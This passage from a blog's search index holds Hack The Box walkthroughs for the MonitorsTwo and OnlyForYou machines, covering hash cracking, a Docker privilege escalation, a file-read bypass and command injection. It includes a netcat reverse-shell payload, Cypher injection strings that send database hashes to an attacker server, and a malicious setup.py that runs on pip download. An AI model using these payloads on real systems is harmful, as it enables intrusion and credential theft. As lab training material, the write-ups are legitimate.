--user=root --password=root cacti -e \u0026#34;show tables\u0026#34;) =~ \u0026#34;automation_devices\u0026#34; ]]; then mysql --host=db --user=root --password=root cacti \u0026lt; /var/www/html/cacti.sql mysql --host=db --user=root --password=root cacti -e \u0026#34;UPDATE user_auth SET must_change_password=\u0026#39;\u0026#39; WHERE username = \u0026#39;admin\u0026#39;\u0026#34; mysql --host=db --user=root --password=root cacti -e \u0026#34;SET GLOBAL time_zone = \u0026#39;UTC\u0026#39;\u0026#34; fi chown www-data:www-data -R /var/www/html # first arg is `-f` or `--some-option` if [ \u0026#34;${1#-}\u0026#34; != \u0026#34;$1\u0026#34; ]; then set -- apache2-foreground \u0026#34;$@\u0026#34; fi exec \u0026#34;$@\u0026#34; The entrypoint.sh script executes several MySQL commands, which use the credentials root:root to access the MariaDB database. With these credentials, it is possible to log into the database and extract the password hashes from the user_auth table. The database consists of multiple tables, but the user_auth table is particularly interesting as it contains usernames and corresponding passwords.\nMySQL [cacti]\u0026gt; describe user_auth; +------------------------+-----------------------+------+-----+---------+----------------+ | Field | Type | Null | Key | Default | Extra | +------------------------+-----------------------+------+-----+---------+----------------+ | id | mediumint(8) unsigned | NO | PRI | NULL | auto_increment | | username | varchar(50) | NO | MUL | 0 | | | password | varchar(256) | NO | | | | ...snip... ...snip... The user_auth table contains password hashes for a new user named Marcus.\nMySQL [cacti]\u0026gt; select id,username,password from user_auth; +----+----------+--------------------------------------------------------------+ | id | username | password | +----+----------+--------------------------------------------------------------+ | 1 | admin | $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC | | 3 | guest | 43e9a4ab75570f5b | | 4 | marcus | $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C | +----+----------+--------------------------------------------------------------+ The password hash for marcus can be cracked using JTR and the rockyou wordlist → marcus:funkymonkey.\n\u0026gt; john hashes --format=bcrypt --show marcus:funkymonkey Testing for password reuse, the credentials are reused on SSH.\n\u0026gt; pc marcus:funkymonkey@10.10.11.211 [20:19:40] Welcome to pwncat 🐈! [20:19:43] 10.10.11.211:22: registered new host w/ db You have mail. (local) pwncat$ (remote) marcus@monitorstwo:/home/marcus$ id uid=1000(marcus) gid=1000(marcus) groups=1000(marcus) Docker engine exploit #After some enumeration, found a mail in the /var/mail directory addressed to Marcus. The mail highlights three different vulnerabilities. While the first two vulnerabilities may not be relevant here, the third vulnerability might be worth exploring further.\n(remote) marcus@monitorstwo:/tmp/abraxas$ ls -la /var/mail total 12 drwxrwsr-x 2 root mail 4096 Mar 22 11:46 . drwxr-xr-x 13 root root 4096 Jan 9 10:03 .. -rw-r--r-- 1 root mail 1809 Oct 18 2021 marcus (remote) marcus@monitorstwo:/tmp/abraxas$ cat /var/mail/marcus From: administrator@monitorstwo.htb To: all@monitorstwo.htb Subject: Security Bulletin - Three Vulnerabilities to be Aware Of Dear all, We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible. CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability. CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability. CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed. We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department. Best regards, Administrator CISO Monitor Two Security Team CVE-2021-41091 is a vulnerability in the Docker engine (v20.10.9) that allows unprivileged users to execute programs with incorrect permissions within the container. This vulnerability occurs when the UID of the user on the host matches the UID of the file owner within the container.\nFound a PoC for the CVE on GitHub. To get root privileges it\u0026rsquo;s necessary to set the SUID bit on /bin/bash before executing the exploit script.\n[!tip] Remember Need to set the SUID bit on the docker container before executing the exploit\nRunning the exploit script tells us that the /var/lib/docker/overlay2/c41d5854e....a372cb2f1/merged is vulnerable to CVE-2021-41091, but it doesn\u0026rsquo;t give a root shell.\n(remote) marcus@monitorstwo:/tmp/abraxas$ bash privEsc.sh [!] Vulnerable to CVE-2021-41091 [!] Now connect to your Docker container that is accessible and obtain root access ! [\u0026gt;] After gaining root access execute this command (chmod u+s /bin/bash) Did you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no): yes [!] Available Overlay2 Filesystems: /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged [!] Iterating over the available Overlay2 filesystems ! [?] Checking path: /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged [x] Could not get root access in \u0026#39;/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged\u0026#39; [?] Checking path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged [!] Rooted ! [\u0026gt;] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged [?] If it didn\u0026#39;t spawn a shell go to this path and execute \u0026#39;./bin/bash -p\u0026#39; [!] Spawning Shell bash-5.1# exit To get a privileged shell, need to navigate to the vulnerable mount and execute its bash binary in privileged mode. Doing so will give Marcus effective root permissions.\n(remote) marcus@monitorstwo:/tmp/abraxas$ ls /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged bin dev etc lib media opt root sbin sys usr boot entrypoint.sh home lib64 mnt proc run srv tmp var (remote) marcus@monitorstwo:/tmp/abraxas$ cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged (remote) marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ ./bin/bash -p (remote) root@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged# id uid=1000(marcus) gid=1000(marcus) euid=0(root) egid=0(root) groups=0(root),1000(marcus) (remote) root@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged# cd /root (remote) root@monitorstwo:/root# ls -al root.txt -rw-r----- 1 root root 33 May 28 00:26 root.txt (remote) root@monitorstwo:/root# Pwned!!\nRelated Links # Cacti: Unauthenticated Remote Code Execution | Sonar ariyaadinatha/cacti-cve-2022-46169-exploit: This is poc of CVE-2022-46169 authentication bypass and remote code execution capsh | GTFOBins Improper Preservation of Permissions in docker | CVE-2021-41091 | Snyk UncleJ4ck/CVE-2021-41091: POC for CVE-2021-41091 ","date":"2 September 2023","permalink":"/blog/htb-monitorstwo/","section":"Blog Posts","summary":"MonitorsTwo is an Easy Linux box that involves exploiting an outdated version of Cacti. This exploit allows to gain a shell within a Docker container. The container also hosts a MariaDB database that stores user credentials, which are reused for SSH access. Finally, to escalate privileges to root a vulnerability in the Docker engine is exploited.","title":"HTB MonitorsTwo"},{"content":"","date":null,"permalink":"/tags/suid/","section":"Tags","summary":"","title":"SUID"},{"content":"","date":null,"permalink":"/tags/cypher-injection/","section":"Tags","summary":"","title":"Cypher-Injection"},{"content":"","date":null,"permalink":"/tags/hisel/","section":"Tags","summary":"","title":"Hisel"},{"content":"OnlyForYou HTB #Overview # OnlyForYou is a Medium Linux box that requires source code analysis. The vhost has a file read vulnerability caused by the os.path.join() function, enabling access to the source code of another virtual host. This, in turn, exposes a command injection vulnerability by bypassing the regex. Additionally, an internal site is susceptible to cipher injection, which allows exfiltrating user hashes. Root escalation involves exploiting pip download using a malicious Python package\nEnumeration # Open Ports #Found two open ports with nmap:\nport 22 → SSH port 80 → Nginx server nmap -p22,80 -sV -sC -T4 -Pn -oA only4you.htb only4you.htb Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-23 20:41 EDT Nmap scan report for only4you.htb (10.129.77.238) Host is up (0.058s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 e883e0a9fd43df38198aaa35438411ec (RSA) | 256 83f235229b03860c16cfb3fa9f5acd08 (ECDSA) |_ 256 445f7aa377690a77789b04e09f11db80 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Only4you Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel port 80 - HTTP #The IP address redirects to the domain, only4you.htb, adding that to /etc/hosts. Unfortunately, the headers don\u0026rsquo;t offer any additional valuable information.\n\u0026gt; http -ph 10.129.77.238 HTTP/1.1 301 Moved Permanently Connection: keep-alive Content-Length: 178 Content-Type: text/html Date: Sat, 24 Jun 2023 00:38:11 GMT Location: http://only4you.htb/ Server: nginx/1.18.0 (Ubuntu) \u0026gt; http -ph only4you.htb HTTP/1.1 200 OK Connection: keep-alive Content-Encoding: gzip Content-Type: text/html; charset=utf-8 Date: Sat, 24 Jun 2023 00:40:56 GMT Server: nginx/1.18.0 (Ubuntu) Transfer-Encoding: chunked Nothing substantial on the index page either.\nbeta.only4you.htb #Bruteforcing for virtual hosts using wfuzz, found beta.only4you.htb, adding it to /etc/hosts.\n\u0026gt; wfuzz_subdomain_enum only4you.htb --hh 178 ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://only4you.htb/ Total requests: 4989 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000033: 200 51 L 145 W 2190 Ch \u0026#34;beta\u0026#34; Total time: 0 Processed Requests: 4989 Filtered Requests: 4988 Requests/sec.: 0 The newly discovered virtual host provides options to download the source code and manipulate images by resizing and converting them.\nFuzzing the vhost for files and directories did not yield any additional information.\n\u0026gt; ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -u http://beta.only4you.htb/FUZZ -o ffuf_beta.md -of md -t 100 ...snip... ...snip... download [Status: 405, Size: 683, Words: 161, Lines: 37, Duration: 61ms] list [Status: 200, Size: 5934, Words: 1979, Lines: 134, Duration: 59ms] source [Status: 200, Size: 12127, Words: 42, Lines: 43, Duration: 61ms] resize [Status: 200, Size: 2984, Words: 564, Lines: 69, Duration: 69ms] convert [Status: 200, Size: 2760, Words: 498, Lines: 62, Duration: 63ms] Foothold # The /source endpoint downloads the source code for the beta site. Based on the structure looks like a flask application.\n\u0026gt; ls -la .rw-r--r-- 4.4k kali 29 Nov 2022 app.py drwxr-xr-x - kali 4 Dec 2022 static drwxr-xr-x - kali 1 Nov 2022 templates .rw-r--r-- 1.7k kali 3 Nov 2022 tool.py drwxr-xr-x - kali 1 Nov 2022 uploads File Read #The download route can potentially be used to read files using the image parameter. Although path traversal won\u0026rsquo;t succeed because of input sanitization, the filters can be bypassed with an absolute path due to the presence of os.path.join.\n@app.route(\u0026#39;/download\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def download(): image = request.form[\u0026#39;image\u0026#39;] filename = posixpath.normpath(image) if \u0026#39;..\u0026#39; in filename or filename.startswith(\u0026#39;../\u0026#39;): flash(\u0026#39;Hacking detected!\u0026#39;, \u0026#39;danger\u0026#39;) return redirect(\u0026#39;/list\u0026#39;) if not os.path.isabs(filename): filename = os.path.join(app.config[\u0026#39;LIST_FOLDER\u0026#39;], filename) try: if not os.path.isfile(filename): flash(\u0026#39;Image doesn\\\u0026#39;t exist!\u0026#39;, \u0026#39;danger\u0026#39;) return redirect(\u0026#39;/list\u0026#39;) except (TypeError, ValueError): raise BadRequest() return send_file(filename, as_attachment=True) As suspected, its vulnerable to LFI with an absolute path. Querying /etc/hostname returns only4you.\n\u0026gt; http --form -pb POST beta.only4you.htb/download image=\u0026#39;/etc/hostname\u0026#39; only4you Identified a couple of additional users by examining the /etc/passwd file for entries with login shells.\n\u0026gt; http --form -pb POST beta.only4you.htb/download image=\u0026#39;/etc/passwd\u0026#39; | grep sh$ root❌0:0:root:/root:/bin/bash john❌1000:1000:john:/home/john:/bin/bash neo4j❌997:997::/var/lib/neo4j:/bin/bash dev❌1001:1001::/home/dev:/bin/bash Attempted to retrieve the app.py from the only4you.htb vhost, but it returns a 404. It\u0026rsquo;s possible that the path ( /var/www/html/app.py ) is incorrect. The configuration for vhosts is usually present in the /etc/nginx/sites-enabled/default file.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026gt; http --form -pb POST beta.only4you.htb/download image=\u0026#39;/etc/nginx/sites-enabled/default\u0026#39; server { listen 80; return 301 http://only4you.htb$request_uri; } server { listen 80; server_name only4you.htb; location / { include proxy_params; proxy_pass http://unix:/var/www/only4you.htb/only4you.sock; } } server { listen 80; server_name beta.only4you.htb; location / { include proxy_params; proxy_pass http://unix:/var/www/beta.only4you.htb/beta.sock; } } Given this information, it seems that the root directory for the only4you.htb virtual host is /var/www/only4you.htb/. Using this the app.py file can be retrieved successfully.\nCommand Injection #/var/www/only4you.htb/app.py\n\u0026gt; http --form -pb POST beta.only4you.htb/download image=\u0026#39;/var/www/only4you.htb/app.py\u0026#39; from flask import Flask, render_template, request, flash, redirect from form import sendmessage import uuid app = Flask(__name__) app.secret_key = uuid.uuid4().hex @app.route(\u0026#39;/\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def index(): if request.method == \u0026#39;POST\u0026#39;: email = request.form[\u0026#39;email\u0026#39;] subject = request.form[\u0026#39;subject\u0026#39;] message = request.form[\u0026#39;message\u0026#39;] ip = request.remote_addr status = sendmessage(email, subject, message, ip) if status == 0: flash(\u0026#39;Something went wrong!\u0026#39;, \u0026#39;danger\u0026#39;) elif status == 1: flash(\u0026#39;You are not authorized!\u0026#39;, \u0026#39;danger\u0026#39;) else: flash(\u0026#39;Your message was successfuly sent! We will reply as soon as possible.\u0026#39;, \u0026#39;success\u0026#39;) return redirect(\u0026#39;/#contact\u0026#39;) else: return render_template(\u0026#39;index.html\u0026#39;) @app.errorhandler(404) def page_not_found(error): return render_template(\u0026#39;404.html\u0026#39;), 404 @app.errorhandler(500) def server_errorerror(error): return render_template(\u0026#39;500.html\u0026#39;), 500 @app.errorhandler(400) def bad_request(error): return render_template(\u0026#39;400.html\u0026#39;), 400 @app.errorhandler(405) def method_not_allowed(error): return render_template(\u0026#39;405.html\u0026#39;), 405 if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;127.0.0.1\u0026#39;, port=80, debug=False) The module imports the sendmessage() function from then form module. So retrieved the form.py file using LFI vulnerability.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026gt; http --form -pb POST beta.only4you.htb/download image=\u0026#39;/var/www/only4you.htb/form.py\u0026#39; import smtplib, re from email.message import EmailMessage from subprocess import PIPE, run import ipaddress def issecure(email, ip): if not re.match(\u0026#34;([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\\.[A-Z|a-z]{2,})\u0026#34;, email): return 0 else: domain = email.split(\u0026#34;@\u0026#34;, 1)[1] result = run([f\u0026#34;dig txt {domain}\u0026#34;], shell=True, stdout=PIPE) output = result.stdout.decode(\u0026#39;utf-8\u0026#39;) ...snip... ...snip... def sendmessage(email, subject, message, ip): status = issecure(email, ip) if status == 2: msg = EmailMessage() msg[\u0026#39;From\u0026#39;] = f\u0026#39;{email}\u0026#39; msg[\u0026#39;To\u0026#39;] = \u0026#39;info@only4you.htb\u0026#39; msg[\u0026#39;Subject\u0026#39;] = f\u0026#39;{subject}\u0026#39; msg[\u0026#39;Message\u0026#39;] = f\u0026#39;{message}\u0026#39; ...snip... ...snip... The sendmessage() function calls the issecure() function and provides it with the email parameter. Inside issecure(), the email is compared against a regular expression. If the condition is satisfied, the portion of the email after the @ symbol is extracted. This extracted part is then utilized to execute the dig command using the subprocess library. Interestingly, the absence of an end anchor, $, in the regex pattern implies that if the pattern is located within a longer string, it will still be regarded as a match. For instance, with the payload test@example.com;id, the regex condition is fulfilled by test@example.com. Additionally the semicolon ; in the payload trigger the execution of the id command when the dig command is run via subprocess.\n\u0026gt;\u0026gt;\u0026gt; import re \u0026gt;\u0026gt;\u0026gt; email = \u0026#39;test@example.com;id\u0026#39; \u0026gt;\u0026gt;\u0026gt; if re.match(\u0026#34;([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\\.[A-Z|a-z]{2,})\u0026#34;, email): print(\u0026#34;Re Bypass!!\u0026#34;) ... Re Bypass!! \u0026gt;\u0026gt;\u0026gt; domain = email.split(\u0026#34;@\u0026#34;, 1)[1] \u0026gt;\u0026gt;\u0026gt; domain \u0026#39;example.com;id\u0026#39; \u0026gt;\u0026gt;\u0026gt; print(f\u0026#34;dig txt {domain}\u0026#34;) dig txt example.com;id Confirmed successful command injection using the ping command.\n\u0026gt; http --form -pb POST only4you.htb \\ \u0026gt; email=\u0026#39;test@example.com;ping -c 3 10.10.14.16\u0026#39; subject=\u0026#39;subject\u0026#39; message=\u0026#39;message\u0026#39; \u0026gt; _ tcpdump -i tun0 icmp tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes 22:10:46.349602 IP only4you.htb \u0026gt; 10.10.14.16: ICMP echo request, id 1, seq 1, length 64 22:10:46.349706 IP 10.10.14.16 \u0026gt; only4you.htb: ICMP echo reply, id 1, seq 1, length 64 22:10:47.348878 IP only4you.htb \u0026gt; 10.10.14.16: ICMP echo request, id 1, seq 2, length 64 22:10:47.348893 IP 10.10.14.16 \u0026gt; only4you.htb: ICMP echo reply, id 1, seq 2, length 64 22:10:48.348418 IP only4you.htb \u0026gt; 10.10.14.16: ICMP echo request, id 1, seq 3, length 64 22:10:48.348434 IP 10.10.14.16 \u0026gt; only4you.htb: ICMP echo reply, id 1, seq 3, length 64 Leveraged the same vulnerability and used a reverse shell payload to get a shell as www-data\n\u0026gt; http --form -pb POST only4you.htb \\ email=\u0026#39;test@example.com;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2\u0026gt;\u0026amp;1|nc 10.10.14.16 9005 \u0026gt;/tmp/f\u0026#39; subject=\u0026#39;subject\u0026#39; message=\u0026#39;message\u0026#39; \u0026gt; pc -lp 9005 [22:13:15] Welcome to pwncat 🐈! __main__.py:164 [22:14:06] received connection from 10.129.77.238:33374 bind.py:84 [22:14:08] 10.129.77.238:33374: registered new host w/ db manager.py:957 (local) pwncat$ (remote) www-data@only4you:/var/www/only4you.htb$ id uid=33(www-data) gid=33(www-data) groups=33(www-data) (remote) www-data@only4you:/var/www/only4you.htb$ Shell as john # Discovered a few open ports. After enumerating them (using netcat and curl ):\nPort 3000 appears to be for Gogs, a git service. Port 8001 seems to host a Gunicorn application. Port 7474 and 7687 are likely associated with Neo4j. (remote) www-data@only4you:/var/www/only4you.htb$ ss -antlp State Recv-Q Send-Q Local Address:Port Peer Address:Port Process LISTEN 0 511 0.0.0.0:80 0.0.0.0:* users:((\u0026#34;nginx\u0026#34;,pid=1041,fd=6),(\u0026#34;nginx\u0026#34;,pid=1040,fd=6)) LISTEN 0 4096 127.0.0.53%lo:53 0.0.0.0:* LISTEN 0 128 0.0.0.0:22 0.0.0.0:* LISTEN 0 4096 127.0.0.1:3000 0.0.0.0:* LISTEN 0 2048 127.0.0.1:8001 0.0.0.0:* LISTEN 0 70 127.0.0.1:33060 0.0.0.0:* LISTEN 0 151 127.0.0.1:3306 0.0.0.0:* LISTEN 0 50 [::ffff:127.0.0.1]:7474 *:* LISTEN 0 128 [::]:22 [::]:* LISTEN 0 4096 [::ffff:127.0.0.1]:7687 *:* To access these ports remotely, used chisel for port forwarding.\nStart a reverse listener on port 1080 on the attack box\n\u0026gt; ./chisel_1.8.1_linux_amd64 server --reverse -p 1080 2023/06/23 22:26:39 server: Reverse tunnelling enabled 2023/06/23 22:26:39 server: Fingerprint udkvbRfz2hUuuPspcbn5uOvvLVclhqVinmVsrLArhQA= 2023/06/23 22:26:39 server: Listening on http://0.0.0.0:1080 2023/06/23 22:41:52 server: session#4: tun: proxy#R:3000=\u0026gt;3000: Listening 2023/06/23 22:41:52 server: session#4: tun: proxy#R:8001=\u0026gt;8001: Listening 2023/06/23 22:41:52 server: session#4: tun: proxy#R:7474=\u0026gt;7474: Listening 2023/06/23 22:41:52 server: session#4: tun: proxy#R:7687=\u0026gt;7687: Listening Connect to the attack box and port forward\n(remote) www-data@only4you:/tmp$ ./chisel client 10.10.14.16:1080 \\ \u0026gt; R:3000:127.0.0.1:3000 \\ \u0026gt; R:8001:127.0.0.1:8001 \\ \u0026gt; R:7474:127.0.0.1:7474 \\ \u0026gt; R:7687:127.0.0.1:7687 Cypher Injection #The Gunicorn application on port 8001 requires credentials. Strangely, using admin:admin credentials allowed access and led to a dashboard.\nTaking into account the earlier information about port 7687 and this new finding, it appears that the application is utilizing a Neo4j database.\nThere\u0026rsquo;s a search field in the employee tab which could to be querying a database. Given that the database is Neo4j, it\u0026rsquo;s possible that this could be a case of cypher injection. Cypher is the query language for the Neo4j database\nUsing this payload for cypher injection exfiltrated the neo4j version using LOAD CSV FROM \u0026lt;URL\u0026gt;,\ntest\u0026#39; OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM \u0026#39;http://10.10.14.16/?version=\u0026#39; + version + \u0026#39;\u0026amp;name=\u0026#39; + name + \u0026#39;\u0026amp;edition=\u0026#39; + edition as l RETURN 0 as _0 // The HTTP server\u0026rsquo;s response indicates that the version is 5.6.\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.129.77.238 - - [24/Jun/2023 12:56:26] code 400, message Bad request syntax (\u0026#39;GET /?version=5.6.0\u0026amp;name=Neo4j Kernel\u0026amp;edition=community HTTP/1.1\u0026#39;) 10.129.77.238 - - [24/Jun/2023 12:56:26] \u0026#34;GET /?version=5.6.0\u0026amp;name=Neo4j Kernel\u0026amp;edition=community HTTP/1.1\u0026#34; 400 - Extracting the labels using the payload,\n\u0026#39;OR 1=1 WITH 1 as a CALL db.labels() yield label LOAD CSV FROM \u0026#39;http://10.10.14.16/?label=\u0026#39;+label as l RETURN 0 as _0 // 10.129.77.238 - - [24/Jun/2023 13:04:07] \u0026#34;GET /?label=user HTTP/1.1\u0026#34; 200 - 10.129.77.238 - - [24/Jun/2023 13:04:07] \u0026#34;GET /?label=employee HTTP/1.1\u0026#34; 200 - 10.129.77.238 - - [24/Jun/2023 13:04:07] \u0026#34;GET /?label=user HTTP/1.1\u0026#34; 200 - 10.129.77.238 - - [24/Jun/2023 13:04:07] \u0026#34;GET /?label=employee HTTP/1.1\u0026#34; 200 - 10.129.77.238 - - [24/Jun/2023 13:04:08] \u0026#34;GET /?label=user HTTP/1.1\u0026#34; 200 - 10.129.77.238 - - [24/Jun/2023 13:04:08] \u0026#34;GET /?label=employee HTTP/1.1\u0026#34; 200 - 10.129.77.238 - - [24/Jun/2023 13:04:08] \u0026#34;GET /?label=user HTTP/1.1\u0026#34; 200 - 10.129.77.238 - - [24/Jun/2023 13:04:08] \u0026#34;GET /?label=employee HTTP/1.1\u0026#34; 200 - 10.129.77.238 - - [24/Jun/2023 13:04:08] \u0026#34;GET /?label=user HTTP/1.1\u0026#34; 200 - 10.129.77.238 - - [24/Jun/2023 13:04:08] \u0026#34;GET /?label=employee HTTP/1.1\u0026#34; 200 - The labels can be further explored using this payload.\n\u0026#39; OR 1=1 WITH 1 as a MATCH (f:\u0026lt;label\u0026gt;) UNWIND keys(f) as p LOAD CSV FROM \u0026#39;http://10.0.2.4:8000/?\u0026#39; + p +\u0026#39;=\u0026#39;+toString(f[p]) as l RETURN 0 as _0 // The user label might contain valuable data, which can be extracted using this payload,\n\u0026#39; OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM \u0026#39;http://10.0.2.4:8000/?\u0026#39; + p +\u0026#39;=\u0026#39;+toString(f[p]) as l RETURN 0 as _0 // This returns username and password hashes for two users: admin and john.\n10.129.77.238 - - [24/Jun/2023 16:42:02] \u0026#34;GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1\u0026#34; 200 - 10.129.77.238 - - [24/Jun/2023 16:42:02] \u0026#34;GET /?username=admin HTTP/1.1\u0026#34; 200 - 10.129.77.238 - - [24/Jun/2023 16:42:02] \u0026#34;GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1\u0026#34; 200 - 10.129.77.238 - - [24/Jun/2023 16:42:02] \u0026#34;GET /?username=john HTTP/1.1\u0026#34; 200 - The hashes can be cracked using John the Ripper.\n\u0026gt; john hashes.txt --format=Raw-SHA256 --show admin:admin john:ThisIs4You Based on /etc/passwd, there\u0026rsquo;s a local user named John. Checking for password reuse, the same credentials are valid for John\u0026rsquo;s local account as well.\n(remote) www-data@only4you:/tmp$ su john Password: john@only4you:/tmp$ id uid=1000(john) gid=1000(john) groups=1000(john) Privilege Escalation to root # John can execute a specific pip3 command as root on localhost, port 3000.\n(remote) john@only4you:/home/john$ sudo -l Matching Defaults entries for john on only4you: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User john may run the following commands on only4you: (root) NOPASSWD: /usr/bin/pip3 download http\\://127.0.0.1\\:3000/*.tar.gz The pip3 download command is used to fetch Python projects from version control systems. In this context, John can use it to download a tar archive from the Gogs git service.\n(remote) john@only4you:/home/john$ pip3 help download Loading KWallet Loading SecretService Loading Windows Loading chainer Loading macOS Usage: pip3 download [options] \u0026lt;requirement specifier\u0026gt; [package-index-options] ... pip3 download [options] -r \u0026lt;requirements file\u0026gt; [package-index-options] ... pip3 download [options] \u0026lt;vcs project url\u0026gt; ... pip3 download [options] \u0026lt;local project path\u0026gt; ... pip3 download [options] \u0026lt;archive url/path\u0026gt; ... Description: Download packages from: - PyPI (and other indexes) using requirement specifiers. - VCS project urls. - Local project directories. - Local or remote source archives. The Gogs server has an user named john. Logged into Gogs as John with the credentials from Neo4j. Additionally, John owns a private repository called Test.\nFound an exploit for pip3 download → Malicious Python Packages and Code Execution via pip download · Embrace The Red\nMalicious python package #Creating a python package with this structure\n. ├── setup.py └── src ├── __init__.py └── main.py main.py: It can hold any arbitrary content. setup.py: It should have two key components: RunCommand(): This function will contain the actual payload RunEggInfoCommand(): This will execute the payload by using cmdclass={\u0026quot;install\u0026quot;: RunInstallCommand, \u0026quot;egg_info\u0026quot;: RunEggInfoCommand} \u0026gt; cat src/main.py print(\u0026#34;Root privilege escalation\u0026#34;) \u0026gt; cat setup.py from setuptools import setup, find_packages from setuptools.command.install import install from setuptools.command.egg_info import egg_info import os def RunCommand(): os.system(\u0026#34;chmod u+s /bin/bash\u0026#34;) class RunEggInfoCommand(egg_info): def run(self): RunCommand() egg_info.run(self) class RunInstallCommand(install): def run(self): RunCommand() install.run(self) setup( name=\u0026#34;pipDownloadExploit\u0026#34;, version=\u0026#34;0.0.1\u0026#34;, license=\u0026#34;MIT\u0026#34;, packages=find_packages(), cmdclass={\u0026#34;install\u0026#34;: RunInstallCommand, \u0026#34;egg_info\u0026#34;: RunEggInfoCommand}, ) Installing required modules in a virtual environment to build the package.\npip3 install setuptools build python3 -m build Building the package will generate a ./dist directory containing a wheel file and an archive.\n. ├── dist │ ├── pipDownloadExploit-0.0.1-py3-none-any.whl │ └── pipDownloadExploit-0.0.1.tar.gz ├── pipDownloadExploit.egg-info │ ├── dependency_links.txt │ ├── PKG-INFO │ ├── SOURCES.txt │ └── top_level.txt ├── setup.py ├── src │ ├── __init__.py │ └── main.py └── venv ├── bin ├── include ├── lib ├── lib64 -\u0026gt; lib └── pyvenv.cfg The archive can be uploaded to the Test repository using the Gogs UI.\nHowever the visibility for the repository needs to be to set to Public, otherwise will result in a 404 error.\nSince pip download expects a package archive, using the link to the raw file on the repository.\n(remote) john@only4you:/home/john$ sudo pip3 download http://127.0.0.1:3000/john/Test/raw/master/pipDownloadExploit-0.0.1.tar.gz Collecting http://127.0.0.1:3000/john/Test/raw/master/pipDownloadExploit-0.0.1.tar.gz Downloading http://127.0.0.1:3000/john/Test/raw/master/pipDownloadExploit-0.0.1.tar.gz (1.0 kB) Saved ./pipDownloadExploit-0.0.1.tar.gz Successfully downloaded pipDownloadExploit (remote) john@only4you:/home/john$ ls -la /bin/bash -rwsr-xr-x 1 root root 1183448 Apr 18 2022 /bin/bash (remote) john@only4you:/home/john$ bash -p (remote) root@only4you:/home/john# cd /root/ (remote) root@only4you:/root# ls -al root.txt -rw-r----- 1 root root 33 Jun 24 00:37 root.txt Pwned!!\nRelated Links # Restrict path access to prevent path traversal — OpenStack Security Advisories 0.0.1.dev264 documentation The 